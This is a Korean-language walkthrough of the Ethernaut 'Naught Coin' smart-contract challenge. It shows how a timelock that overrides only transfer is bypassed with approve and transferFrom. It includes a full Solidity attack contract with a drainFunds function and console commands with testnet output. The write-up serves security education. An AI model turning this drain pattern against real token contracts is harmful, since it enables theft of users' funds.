https://teberr.notion.site/Ethernaut-Naught-Coin-6031cfafe77f489b83887c8a5e4c10da

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ea6159a1-1ddc-427e-975e-221e26e3fc9b/Untitled.png)

> NaughtCoin은 ERC20 규격을 따르는 토큰이고 이미 모든 NaughtCoin을 가지고 있습니다. 하지만 토큰을 전송하려면 락업이 10년으로 설정되어 있어 transfer를 하려면 10년을 기다려야 합니다. 이 토큰을 다른 주소로 보내어 가진 토큰의 개수를 0으로 만들면 성공입니다. 

힌트:
- ERC20 스펙을 참고하세요
- [https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)
> 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
}
```

# 코드 분석 및 공격 설계

```solidity
  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
```

Naught Coin의 생성자이다. 총 백만 토큰을 생성하여 내 지갑 주소로 발행해준다(_mint).

```solidity
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
```

msg.sender가 player 즉 발행 받은 ‘나’인 경우 트랜잭션을 보냈을 때 block.timestamp가 timeLock 보다 커야하는 조건 modifier 이다. timeLock은 player가 토큰을 발행받고 10년 뒤로 설정되어 있다.

```solidity
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }
```

ERC20의 transfer를 오버라이드한 함수로 player가 10년 뒤에만 전송이 가능하도록 설정되어 있다. 

즉 현재 상황을 요약하면 100만개의 Naught 토큰을 가지고있지만 transfer(전송)함수를 이용하려면 10년 뒤에만 가능하므로 전송을 하지 못하는 상황이다. 

이 Naught 코인은 ERC20을 상속받고 있으므로 ERC20에 있는 함수들을 살펴보면 transfer를 제외하고도 전송할 수 있는 함수가 하나 있다.

![transferFrom.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2aa5a6a6-4359-406b-a143-5dd26f42c682/transferFrom.png)

transferFrom 함수는 sender의 주소로부터 recipient 주소로, amount 만큼 보내는 함수이다. 이 함수를 실행하기 위해서는 먼저 sender에게 approve를 받아야 한다.

![approve.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e6f39e5c-6a47-4beb-8fd5-2b770ad7d3fa/approve.png)

이 함수를 호출한 caller가 spender에게 자신이 가진 토큰 중 amount 만큼 전송할 권한을 넘겨주는 함수이다. 이 함수를 호출하고 나면 spender는 내가 가진 토큰 중 amount 만큼 마음대로 다른 주소로 옮길 수 있다.

이 transferFrom함수와 approve 함수는 Naught Coin 컨트랙트에서 오버라이딩 하지 않아 아무런 제한 없이 사용이 가능하므로 이 두 함수를 이용하여 player의 토큰을 다른 주소로 옮길 수 있다.

# 공격

공격 컨트랙트를 작성해서 내 메타마스크 지갑의 Naught Coin을 빼내기 위해서는 먼저 approve를 내 공격 컨트랙트로 설정해주어야 한다.

먼저 공격 컨트랙트를 작성해서 deploy하여 주소가 정해져야 하므로 공격컨트랙트에 있어야 하는 함수를 생각하면 다음과 같다.

1. transferFrom(player, address(this), balancceOf(address(player)) → 공격을 위한 함수
2. balanceOf(address(player)) → 공격 이후 플레이어의 지갑에 있는 토큰 개수를 알기 위한 함수
3. balanceOf(address(this)) → 공격 이후에 이 컨트랙트에 있는 토큰의 개수를 알기 위한 함수

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface INaughtCoin{
    function transferFrom(address,address,uint256)external returns(bool);
    function balanceOf(address)external returns(uint256);
}

contract attack{
    INaughtCoin coin;
    address target=0x83b26d6A3D3FaBd9F0A5f1d69DCA1CE6cc4eA39a;
    uint256 public thisbalance;
    uint256 public senderbalance;
    constructor(address _coin){
        coin=INaughtCoin(_coin);
    }
    function drainFunds()public{
        coin.transferFrom(target, address(this), coin.balanceOf(target));
    }
    function balancethis()public{
        thisbalance= coin.balanceOf(address(this));
    }
    function balancesender()public{
        senderbalance=coin.balanceOf(target);
    }
}
```

이 컨트랙트가 drainFunds()를 수행하여 player의 주소에서 토큰을 전부 가져오기 위해서는 먼저 player가 approve를 해주어야 한다.

![contract 주소.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/473ae7c4-8f83-4bef-9e45-a42a60da7e43/contract_%EC%A3%BC%EC%86%8C.png)

공격 컨트랙트의 주소는 0x14551e575B69874cD9AE7FF657292A397154724F 이므로 콘솔에서 다음과 같이 수행해준다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b4b96fa9-35e7-4402-ad5e-68fd6ed109fd/Untitled.png)

```solidity
await contract.approve('0x14551e575B69874cD9AE7FF657292A397154724F',await contract.balanceOf(player))
⛏️ Sent transaction ⛏ https://sepolia.etherscan.io/tx/0xc3e5996d3563e1f2fb003bdb576eed40b6b69019dda5f8fc36ff598ee63c72bd
⛏️ Mined transaction ⛏ https://sepolia.etherscan.io/tx/0xc3e5996d3563e1f2fb003bdb576eed40b6b69019dda5f8fc36ff598ee63c72bd
{tx: '0xc3e5996d3563e1f2fb003bdb576eed40b6b69019dda5f8fc36ff598ee63c72bd', receipt: {…}, logs: Array(1)}
```

이제 approve를 해주었으므로 공격 컨트랙트는 내 메타마스크에서 토큰을 전부 빼낼 수 있게 된다.

![공격전.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1eb44ba9-101f-4a9d-804c-20674d7e13c6/%EA%B3%B5%EA%B2%A9%EC%A0%84.png)

공격 전에는 target인 내 메타마스크 주소에 토큰이 존재하고 공격 컨트랙트에는 없음을 볼 수 있다.

drainFunds 를 실행시켜 내 메타마스크 주소에서 공격 컨트랙트로 토큰을 이동시키자.

```solidity
    function drainFunds()public{
        coin.transferFrom(target, address(this), coin.balanceOf(target));
    }
```

![공격후.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3828f163-701a-4b7b-82a5-6113c9fbe677/%EA%B3%B5%EA%B2%A9%ED%9B%84.png)

공격 후 player의 모든 토큰이 공격 컨트랙트로 넘어온 것을 확인할 수 있다. 문제 조건을 충족했으므로 인스턴스를 제출하면 성공하게 된다.

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/37c25b4a-b82f-472e-8f1c-2fac7f9dc5cf/%EC%84%B1%EA%B3%B5.png)

# 문제 후기

직접 작성한 코드가 아닌 다른 코드를 import 하여 사용할 때는 코드를 잘 이해하고 가져오는 것이 좋습니다. 예를 들어 import의 import가 있을 수도 있으며 인증 제어 구현할 때 특히 중요합니다. 이 예제에서는 코드에서 transfer에 대한 인증 제어만 구현하였기 때문에 다른 방식으로 같은 기능을 수행하는 다른 함수로 우회할 수 있습니다.
